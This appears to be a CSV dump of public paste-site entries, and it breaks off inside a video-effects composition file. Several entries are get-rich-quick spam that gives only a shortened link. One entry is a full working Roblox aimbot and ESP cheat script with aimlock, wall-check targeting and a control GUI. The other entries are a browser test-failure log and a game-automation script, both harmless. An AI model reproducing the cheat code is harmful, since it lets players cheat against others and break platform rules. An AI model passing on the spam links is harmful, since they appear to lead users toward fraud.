id,title,username,language,date,content
AMdexrXw,Make $1000 15-MINUTES ⭐ (BEGINNER) BB,triplecross,JavaScript,Tuesday 8th of April 2025 01:05:30 PM CDT," 
Pdf https://surl.li/lgybtn


V04MY0lpk6
"
56bqMbeF,Roblox Universal Aimbot Script,bonrwild,Lua,Tuesday 8th of April 2025 12:53:12 PM CDT,"-- Enhanced Aimlock & ESP Script with Splash Screen (Alex Gaming)

-- Configuration table to centralize settings
local config = {
    teamCheck = false,
    fov = 120,
    lockPart = ""HumanoidRootPart"",
    aimbotEnabled = false,
    espEnabled = true,
    headAimEnabled = false,
    themeColor = Color3.fromRGB(0, 122, 255)
}

-- Required services
local RunService = game:GetService(""RunService"")
local Players = game:GetService(""Players"")
local UserInputService = game:GetService(""UserInputService"")
local TweenService = game:GetService(""TweenService"")
local Camera = workspace.CurrentCamera
local localPlayer = Players.LocalPlayer

-- Global variable for distance display
local currentTargetDistance = ""N/A""

-- ESP Variables
local highlightedPlayers = {}

-- Create Highlight Function for ESP
local function createHighlight(player)
    local function setupHighlight(character)
        local root = character:FindFirstChild(""HumanoidRootPart"")
        if root then
            local highlight = Instance.new(""Highlight"")
            highlight.Adornee = character
            highlight.FillColor = config.themeColor
            highlight.FillTransparency = 0.5
            highlight.OutlineColor = Color3.new(1, 1, 1)
            highlight.OutlineTransparency = 0.3
            highlight.Enabled = config.espEnabled
            highlight.Parent = character

            highlightedPlayers[player] = highlight
        else
            task.delay(1, function()
                if character and character:FindFirstChild(""HumanoidRootPart"") then
                    setupHighlight(character)
                end
            end)
        end
    end

    if player.Character then
        setupHighlight(player.Character)
    end

    player.CharacterAdded:Connect(function(character)
        task.wait(0.5) -- Ensure character is ready
        setupHighlight(character)
    end)
end

-- Remove Highlight for a Player
local function removeHighlight(player)
    if highlightedPlayers[player] then
        highlightedPlayers[player]:Destroy()
        highlightedPlayers[player] = nil
    end
end

-- Clean-up when a player leaves
Players.PlayerRemoving:Connect(function(player)
    removeHighlight(player)
end)

-- Find Closest Target with Line-of-Sight (LOS) Check
local function getClosestTarget()
    local closestTarget = nil
    local shortestDistance = math.huge
    currentTargetDistance = ""N/A"" -- Reset distance each search

    local screenCenter = Camera.ViewportSize / 2
    local localRoot = localPlayer.Character and localPlayer.Character:FindFirstChild(""HumanoidRootPart"")
    local localPosition = localRoot and localRoot.Position or Vector3.new(0, 0, 0)

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer and player.Character then
            local targetPart = config.headAimEnabled and player.Character:FindFirstChild(""Head"") or player.Character:FindFirstChild(config.lockPart)
            local humanoid = player.Character:FindFirstChild(""Humanoid"")
            if targetPart and humanoid and humanoid.Health > 0 then
                local distanceFromPlayer = (localPosition - targetPart.Position).Magnitude
                local screenPoint, onScreen = Camera:WorldToViewportPoint(targetPart.Position)
                local distanceOnScreen = (Vector2.new(screenPoint.X, screenPoint.Y) - screenCenter).Magnitude

                if onScreen and distanceOnScreen < shortestDistance and distanceOnScreen <= config.fov then
                    -- Line-of-Sight Check using raycast
                    local rayDirection = (targetPart.Position - localPosition)
                    local rayParams = RaycastParams.new()
                    rayParams.FilterDescendantsInstances = {localPlayer.Character}
                    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
                    local rayResult = workspace:Raycast(localPosition, rayDirection, rayParams)
                    
                    if not (rayResult and rayResult.Instance and not rayResult.Instance:IsDescendantOf(player.Character)) then
                        if not config.teamCheck or (player.Team ~= localPlayer.Team) then
                            closestTarget = player
                            shortestDistance = distanceOnScreen
                            currentTargetDistance = math.floor(distanceFromPlayer)
                        end
                    end
                end
            end
        end
    end

    return closestTarget
end

-- Aimbot with Softer Prediction
local currentTarget = nil

local function lockOnTarget(deltaTime)
    if currentTarget and currentTarget.Character then
        local targetPart = config.headAimEnabled and currentTarget.Character:FindFirstChild(""Head"") or currentTarget.Character:FindFirstChild(""HumanoidRootPart"")
        if targetPart then
            local targetVelocity = targetPart.Velocity or Vector3.new(0, 0, 0)
            local numericDistance = tonumber(currentTargetDistance) or 0
            local predictionFactor = math.clamp(0.05 + (numericDistance / 2000) * deltaTime, 0.02, 0.1)
            local predictedPosition = targetPart.Position + (targetVelocity * predictionFactor)
            Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, predictedPosition), 0.2)
        else
            currentTarget = nil
        end
    end
end

-- Combined RenderStepped for ESP, Aimlock, and GUI Updates
local guiUpdateTimer = 0
local distanceLabel -- For updating distance in GUI

RunService.RenderStepped:Connect(function(deltaTime)
    -- Update ESP for all players
    if config.espEnabled then
        for _, player in pairs(Players:GetPlayers()) do
            if not highlightedPlayers[player] and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
                createHighlight(player)
            elseif highlightedPlayers[player] then
                highlightedPlayers[player].Enabled = config.espEnabled
            end
        end
    end

    -- Aimlock Loop
    if config.aimbotEnabled then
        if UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
            if not currentTarget then
                currentTarget = getClosestTarget()
            end
            if currentTarget then
                lockOnTarget(deltaTime)
            end
        else
            currentTarget = nil
        end
    end

    -- Throttled GUI Distance Update (every 0.1 sec)
    guiUpdateTimer = guiUpdateTimer + deltaTime
    if guiUpdateTimer >= 0.1 and distanceLabel then
        distanceLabel.Text = ""Distance: "" .. tostring(currentTargetDistance) .. ""m""
        guiUpdateTimer = 0
    end
end)

-- Main GUI creation function (for aimlock controls and settings)
local function createGUI()
    if game.CoreGui:FindFirstChild(""Aimlock_GUI"") then
        game.CoreGui.Aimlock_GUI:Destroy()
    end

    local ScreenGui = Instance.new(""ScreenGui"")
    ScreenGui.Name = ""Aimlock_GUI""
    ScreenGui.Parent = game.CoreGui

    local Frame = Instance.new(""Frame"", ScreenGui)
    Frame.Size = UDim2.new(0, 200, 0, 200)
    Frame.Position = UDim2.new(1, -220, 0, 50)
    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Frame.BorderSizePixel = 2
    Frame.BorderColor3 = config.themeColor

    local function createButton(name, posY, text, callback)
        local button = Instance.new(""TextButton"", Frame)
        button.Size = UDim2.new(0, 180, 0, 22)
        button.Position = UDim2.new(0, 10, 0, posY)
        button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
        button.BorderSizePixel = 2
        button.BorderColor3 = config.themeColor
        button.Text = text
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.TextScaled = true

        button.MouseButton1Click:Connect(function()
            callback(button)
        end)
        return button
    end

    distanceLabel = Instance.new(""TextLabel"", Frame)
    distanceLabel.Size = UDim2.new(0, 180, 0, 20)
    distanceLabel.Position = UDim2.new(0, 10, 0, 160)
    distanceLabel.BackgroundTransparency = 1
    distanceLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    distanceLabel.TextScaled = true
    distanceLabel.Text = ""Distance: N/A""

    createButton(""Aimlock"", 10, ""Aimlock: OFF"", function(button)
        config.aimbotEnabled = not config.aimbotEnabled
        button.Text = config.aimbotEnabled and ""Aimlock: ON"" or ""Aimlock: OFF""
    end)

    createButton(""Head Aim"", 40, ""Head Aim: OFF"", function(button)
        config.headAimEnabled = not config.headAimEnabled
        button.Text = config.headAimEnabled and ""Head Aim: ON"" or ""Head Aim: OFF""
    end)

    createButton(""ESP"", 70, ""ESP: ON"", function(button)
        config.espEnabled = not config.espEnabled
        button.Text = config.espEnabled and ""ESP: ON"" or ""ESP: OFF""
    end)

    createButton(""Theme Color"", 100, ""Change Theme"", function(button)
        config.themeColor = (config.themeColor == Color3.fromRGB(0, 122, 255)) and Color3.fromRGB(255, 165, 0) or Color3.fromRGB(0, 122, 255)
        Frame.BorderColor3 = config.themeColor
    end)
    
    createButton(""FOV"", 130, ""FOV: "" .. config.fov, function(button)
        local fovValues = {120, 200, 300}
        local currentIndex = table.find(fovValues, config.fov) or 1
        config.fov = fovValues[(currentIndex % #fovValues) + 1]
        button.Text = ""FOV: "" .. config.fov
    end)
end

-- Splash Screen Function to display a pop-in logo for ""Alex Gaming""
local function showSplashScreen()
    local splashGui = Instance.new(""ScreenGui"")
    splashGui.Name = ""SplashGui""
    splashGui.Parent = game.CoreGui

    local splashLabel = Instance.new(""TextLabel"", splashGui)
    splashLabel.Size = UDim2.new(0, 400, 0, 150)
    splashLabel.Position = UDim2.new(0.5, -200, 0.5, -75)
    splashLabel.BackgroundTransparency = 1
    splashLabel.Text = ""Alex Gaming""
    splashLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    splashLabel.Font = Enum.Font.GothamBold
    splashLabel.TextScaled = true
    splashLabel.TextTransparency = 1 -- Start invisible
    splashLabel.ZIndex = 10

    -- Tween in for a pop effect
    local tweenInfoIn = TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    local tweenIn = TweenService:Create(splashLabel, tweenInfoIn, {TextTransparency = 0})
    tweenIn:Play()

    task.wait(2) -- Display the logo for 2 seconds

    -- Tween out to fade away
    local tweenInfoOut = TweenInfo.new(0.5, Enum.EasingStyle.Linear)
    local tweenOut = TweenService:Create(splashLabel, tweenInfoOut, {TextTransparency = 1})
    tweenOut:Play()
    tweenOut.Completed:Wait()

    splashGui:Destroy()

    -- Start the main GUI after the splash
    createGUI()
end

-- Start by showing the splash screen, then begin the aimlock script
showSplashScreen()"
uUQRKDcR,⭐EARN $900 INSTANTLY 2025 MI,triplecross,JavaScript,Tuesday 8th of April 2025 12:52:05 PM CDT," 
Pdf https://surl.li/lgybtn


RTJz0GG4t4
"
96yHBdrp,EARN $900 INSTANTLY 2025⭐ YF,B4AT,JavaScript,Tuesday 8th of April 2025 12:38:20 PM CDT," 
Pdf https://surl.li/lgybtn


RTP7iGI484
"
NRDqjNKS,Untitled,Temidayo12,Bash,Tuesday 8th of April 2025 12:37:31 PM CDT,"/webdriver/tests/bidi/browser/set_client_window_state/invalid.py
  FAIL test_client_window_width_invalid_bounds[2147483649] - Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f7c986ad290>
first_window_id = 'bf9e3be5-6150-46b5-8f81-32f9289b800e', bound = 2147483649

    @pytest.mark.parametrize(""bound"", [-1, MAX_INT + 1])
    async def test_client_window_width_invalid_bounds(bidi_session, first_window_id, bound):
>       with pytest.raises(error.InvalidArgumentException):
E       Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f7c986ad290>
bound      = 2147483649
first_window_id = 'bf9e3be5-6150-46b5-8f81-32f9289b800e'

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/invalid.py:86: Failed
  FAIL test_client_window_height_invalid_bounds[2147483649] - Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f7c986ad290>
first_window_id = 'bf9e3be5-6150-46b5-8f81-32f9289b800e', bound = 2147483649

    @pytest.mark.parametrize(""bound"", [-1, MAX_INT + 1])
    async def test_client_window_height_invalid_bounds(bidi_session, first_window_id, bound):
>       with pytest.raises(error.InvalidArgumentException):
E       Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f7c986ad290>
bound      = 2147483649
first_window_id = 'bf9e3be5-6150-46b5-8f81-32f9289b800e'

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/invalid.py:104: Failed
/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py
  FAIL test_move_xy - assert 450 == 800
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_move_xy(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            x=100,
            y=200
        )
        assert result[""state""] == ""normal""
        assert result[""x""] == 100
        assert result[""y""] == 200
>       assert result[""width""] == initial_window_state[""width""]
E       assert 450 == 800

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 120,
 'state': 'normal',
 'width': 450,
 'x': 100,
 'y': 200}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:17: AssertionError
  FAIL test_move_x - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_move_x(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            x=100
        )
        assert result[""state""] == ""normal""
        assert result[""x""] == 100
>       assert result[""y""] == initial_window_state[""y""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 120,
 'state': 'normal',
 'width': 450,
 'x': 100,
 'y': 0}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:28: AssertionError
  FAIL test_move_y - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_move_y(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            y=200
        )
        assert result[""state""] == ""normal""
        assert result[""y""] == 200
>       assert result[""x""] == initial_window_state[""x""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 120,
 'state': 'normal',
 'width': 450,
 'x': 0,
 'y': 200}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:40: AssertionError
  FAIL test_resize_width_height - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_resize_width_height(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            width=800,
            height=600
        )
        assert result[""state""] == ""normal""
        assert result[""width""] == 800
        assert result[""height""] == 600
        # Verify other values haven't changed
>       assert result[""x""] == initial_window_state[""x""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 0,
 'y': 0}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:55: AssertionError
  FAIL test_resize_width - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_resize_width(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            width=800
        )
        assert result[""state""] == ""normal""
        assert result[""width""] == 800
        # Verify other values haven't changed
>       assert result[""x""] == initial_window_state[""x""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 120,
 'state': 'normal',
 'width': 800,
 'x': 0,
 'y': 0}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:67: AssertionError
  FAIL test_resize_height - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_resize_height(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL,
            height=600
        )
        assert result[""state""] == ""normal""
        assert result[""height""] == 600
        # Verify other values haven't changed
>       assert result[""x""] == initial_window_state[""x""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 450,
 'x': 0,
 'y': 0}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:80: AssertionError
  FAIL test_no_position_resize - assert 0 == 100
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True, 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c', 'height': 600, 'state': 'normal', ...}

    async def test_no_position_resize(bidi_session, first_window_id, initial_window_state):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=ClientWindowRectState.NORMAL
        )
        assert result[""state""] == ""normal""
>       assert result[""x""] == initial_window_state[""x""]
E       assert 0 == 100

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f81f02b7b90>
first_window_id = '642f34b5-b7ff-4d63-9d64-22ef2950296c'
initial_window_state = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 600,
 'state': 'normal',
 'width': 800,
 'x': 100,
 'y': 100}
result     = {'active': True,
 'clientWindow': '642f34b5-b7ff-4d63-9d64-22ef2950296c',
 'height': 120,
 'state': 'normal',
 'width': 450,
 'x': 0,
 'y': 0}

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py:90: AssertionError
/webdriver/tests/bidi/browser/set_client_window_state/state.py
  FAIL test_set_client_window_state_transitions[m-to-i-f-to-u] - AssertionError: assert 'minimized' == 'fullscreen'
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f733d5f3e50>, initial_state = 'minimized'
target_state = 'fullscreen', first_window_id = '8e307b10-bcb8-40de-81db-1a1c3215b4b9'

    @pytest.mark.parametrize(
        ""initial_state,target_state"",
        [
            (""fullscreen"", ""normal""),
            (""fullscreen"", ""maximized""),
            (""fullscreen"", ""minimized""),

            (""maximized"", ""fullscreen""),
            (""maximized"", ""normal""),
            (""maximized"", ""minimized""),

            (""minimized"", ""fullscreen""),
            (""minimized"", ""maximized""),
            (""minimized"", ""normal""),

            (""normal"", ""fullscreen""),
            (""normal"", ""maximized""),
            (""normal"", ""minimized""),
        ],
        ids=lambda states: f""{states[0]}-to-{states[1]}""
    )
    @pytest.mark.asyncio
    async def test_set_client_window_state_transitions(bidi_session, initial_state, target_state, first_window_id):
        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=initial_state
        )
        assert result[""state""] == initial_state

        result = await bidi_session.browser.set_client_window_state(
            client_window=first_window_id,
            state=target_state
        )
>       assert result[""state""] == target_state
E       AssertionError: assert 'minimized' == 'fullscreen'
E
E         - fullscreen
E         + minimized

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f733d5f3e50>
first_window_id = '8e307b10-bcb8-40de-81db-1a1c3215b4b9'
initial_state = 'minimized'
result     = {'active': True,
 'clientWindow': '8e307b10-bcb8-40de-81db-1a1c3215b4b9',
 'height': 600,
 'state': 'minimized',
 'width': 800,
 'x': 100,
 'y': 100}
target_state = 'fullscreen'

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/state.py:36: AssertionError
/webdriver/tests/bidi/browser/set_client_window_state/stress.py
  TIMEOUT /webdriver/tests/bidi/browser/set_client_window_state/stress.py
 1:28.66 INFO Got 4 unexpected results, with 0 unexpected passes
 1:28.67 wptserve INFO Stopped WebTransport over HTTP/3 server on 127.0.0.1:11000
 1:28.70 wptserve INFO Stopped http server on 127.0.0.1:8003
 1:28.70 wptserve INFO Close on: (<AddressFamily.AF_INET: 2>, <SocketKind.SOCK_STREAM: 1>, 6, '', ('127.0.0.1', 8888))
 1:28.84 wptserve INFO Stopped http server on 127.0.0.1:8443
 1:28.85 wptserve INFO Stopped http server on 127.0.0.1:8445
 1:28.85 wptserve INFO Stopped http server on 127.0.0.1:8444
 1:28.89 wptserve INFO Close on: (<AddressFamily.AF_INET: 2>, <SocketKind.SOCK_STREAM: 1>, 6, '', ('127.0.0.1', 8889))
 1:29.02 wptserve INFO Stopped http server on 127.0.0.1:9000
 1:29.07 wptserve INFO Stopped http server on 127.0.0.1:8446
 1:29.07 wptserve INFO Stopped http server on 127.0.0.1:8002
 1:29.10 wptserve INFO Stopped http server on 127.0.0.1:8000
 1:29.16 wptserve INFO Stopped http server on 127.0.0.1:8001
 1:29.23 INFO Removed font: Ahem.ttf
 1:29.29 INFO Closing logging queue
 1:29.29 INFO queue closed"
bF7GQigx,ccFarm,Te-ki,Lua,Tuesday 8th of April 2025 12:34:17 PM CDT,"local plantsDb = {}

-- Save / Load
local filePath = ""ccFarm.save""
local function save()
	local savedFile = fs.open(filePath, ""w"")
	savedFile.write(textutils.serialize(plantsDb))
	savedFile.flush()
	savedFile.close()
end
local function load()
	if fs.exists(filePath) and fs.getSize(filePath) > 0 then
		local savedFile = fs.open(filePath, ""r"")
		plantsDb = textutils.unserialize(savedFile.readAll())
		savedFile.close()
    end
end
load()

-- Message handling
local monitor = term.current()
local sizeX, sizeY = monitor.getSize()
local lastMsg = """"
local lastMsgCount = 0
local function logMsg(msg)
	monitor.setCursorPos(1,13)
	monitor.clearLine()
	if lastMsg == msg then
		lastMsgCount = lastMsgCount + 1
		msg = msg .. "" "" .. lastMsgCount
	else
		lastMsg = msg
		lastMsgCount = 0
		monitor.scroll(1)
	end
	monitor.setCursorPos(1,12)
	monitor.clearLine()
	monitor.write(msg)
	monitor.setCursorPos(1,13)
end
local function msg(msg)
	monitor.setCursorPos(1,13)
	monitor.clearLine()
	monitor.write(msg)
end

-- Setup
local tArgs = { ... }
if #tArgs < 1 then
    local programName = arg[0] or fs.getName(shell.getRunningProgram())
    logMsg(""To start farming type:"")
    logMsg(programName .. "" <1>"")
    logMsg(""<1>: the size of the farm."")
    logMsg(""The size can be 0 to 8."")
    logMsg(""Turtle must be at the center of the farm."")
    logMsg(""With size 0 turtle consume no fuel and will mine in a cross shaped pattern :"")
    logMsg("" X "")
    logMsg(""XTX"")
    logMsg("" X "")
    return 0
end
local farmSize = tArgs[1] + 0

local function isSeed(itemName)
    return string.match(itemName, ""_seeds$"") ~= nil
end

local function selectSeedsSlot(seedName)
    if seedName ~= nil then
        local otherSeedSlot = 0
        for slot = 1, 16 do
            local itemDetail = turtle.getItemDetail(slot)
            if itemDetail ~= nil and itemDetail.name == seedName then
                turtle.select(slot)
                return true
            elseif itemDetail ~= nil and isSeed(itemDetail.name) then
                otherSeedSlot = slot
            end
        end
		if otherSeedSlot > 0 then
            turtle.select(otherSeedSlot)
            return true
		end
    end
	for slot = 1, 16 do
		local itemDetail = turtle.getItemDetail(slot)
		if itemDetail ~= nil and isSeed(itemDetail.name) then
            turtle.select(slot)
            return true
		end
	end
    return false
end

local function getTurtleInventory()
    local inventory = {}
	for slot = 1, 16 do
		inventory[slot] = turtle.getItemDetail(slot)
	end
    return inventory
end

local function compareInventories(firstInventory, secondInventory)
    local items = {}
	for slot = 1, 16 do
        if firstInventory[slot] ~= nil then
            items[firstInventory[slot].name] = (items[firstInventory[slot].name] or 0) - firstInventory[slot].count
        end
        if secondInventory[slot] ~= nil then
            items[secondInventory[slot].name] = (items[secondInventory[slot].name] or 0) + secondInventory[slot].count
        end
	end
    for key, value in pairs(items) do
        if value == 0 then
            items[key] = nil
        end
    end
    return items
end

local function findCrop(itemList)
    local crop = nil
    local totalItems = 0
    for name, count in pairs(itemList) do
        if count > 0 then
            totalItems = totalItems + count
            if isSeed(name) or crop == nil then
                crop = name
            end
        end
    end
    return crop, totalItems
end

local function plantSeed(seedName)
    local success = false
    if selectSeedsSlot(seedName) then
        success = turtle.place()
        turtle.select(1)
    else
        logMsg(""No more seeds!"")
    end
    return success
end
local function harvest()
    if turtle.detect() then
        while turtle.dig() do
            while turtle.suck() do
            end
        end
    end
end

if farmSize == 0 then
    while true do
        local success, plantData = turtle.inspect()
        if success and plantData.state then
            local plant = plantsDb[plantData.name] or {seedName = nil, maxAge = 1, needTest = true}
            if plantData.state.age >= plant.maxAge then
                local oldInventory = nil
                if plant.needTest == true then
                    logMsg(""Analyzing "" .. plantData.name .. "" stage "" .. plantData.state.age)
                    oldInventory = getTurtleInventory()
                end
                harvest()
                if plant.needTest == true then
                    local newInventory = getTurtleInventory()
                    local newItems = compareInventories(oldInventory, newInventory)
                    local seedName, itemsCount = findCrop(newItems)
                    if seedName ~= nil then
                        plant.seedName = seedName
                        plantsDb[plantData.name] = plant
                    end
                    if itemsCount > 1 then
                        plant.maxAge = plantData.state.age
                        plant.needTest = false
                        logMsg(plantData.name .. "" is now fully known."")
                    else
                        plant.maxAge = plantData.state.age + 1
                    end
                    save()
                end
                plantSeed(plant.seedName)
            end
        end
        turtle.turnRight()
        sleep(0)
    end
end
"
7vFB5RrJ,Make $1000 15-MINUTES ⭐ (BEGINNER) BB,B4AT,JavaScript,Tuesday 8th of April 2025 12:24:52 PM CDT," 
Pdf https://surl.li/lgybtn


TrMGXcmwDP
"
Q6jLHTei,Particle text cloud,marcusa3000,Lua,Tuesday 8th of April 2025 12:15:43 PM CDT,"{
	Tools = ordered() {
		Camera3D2 = Camera3D {
			Inputs = {
				[""Transform3DOp.Translate.X""] = Input { Value = -0.53148289629741, },
				[""Transform3DOp.Translate.Y""] = Input { Value = -0.831476236085091, },
				[""Transform3DOp.Translate.Z""] = Input { Value = 4.42, },
				[""Transform3DOp.Rotate.X""] = Input { Value = 15.5999975204468, },
				[""Transform3DOp.Rotate.Y""] = Input { Value = -6.6, },
				FLength = Input { Value = 18.2123442718302, },
				[""Stereo.Mode""] = Input { Value = FuID { ""OffAxis"" }, },
				FilmGate = Input { Value = FuID { ""BMD_URSA_4K_16x9"" }, },
				[""SurfacePlaneInputs.ObjectID.ObjectID""] = Input { Value = 8, },
				[""MtlStdInputs.MaterialID""] = Input { Value = 10, }
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 2458.5 } },
		},
		pEmitter3 = pEmitter {
			ID = 94466,
			Inputs = {
				Number = Input {
					Value = 0,
					Expression = ""time>0 and 0 or 10000"",
				},
				Lifespan = Input { Value = 1000, },
				PositionVariance = Input { Value = 0.1, },
				RotationControls = Input { Value = 1, },
				SpinControls = Input { Value = 1, },
				SpinZVariance = Input { Value = 2, },
				Style = Input { Value = FuID { ""ParticleStyleBitmap"" }, },
				[""ParticleStyleBitmap.DropToolsHere""] = Input {
					SourceOp = ""BrightnessContrast25"",
					Source = ""Output"",
				},
				Region = Input { Value = FuID { ""MeshRegion"" }, },
				[""MeshRegion.MeshInput""] = Input {
					SourceOp = ""Text3D1"",
					Source = ""Output"",
				},
				[""ParticleStyle.SizeControls""] = Input { Value = 1, },
				[""ParticleStyle.SizeVariance""] = Input { Value = 0.1, },
				[""ParticleStyle.SizeOverLife""] = Input {
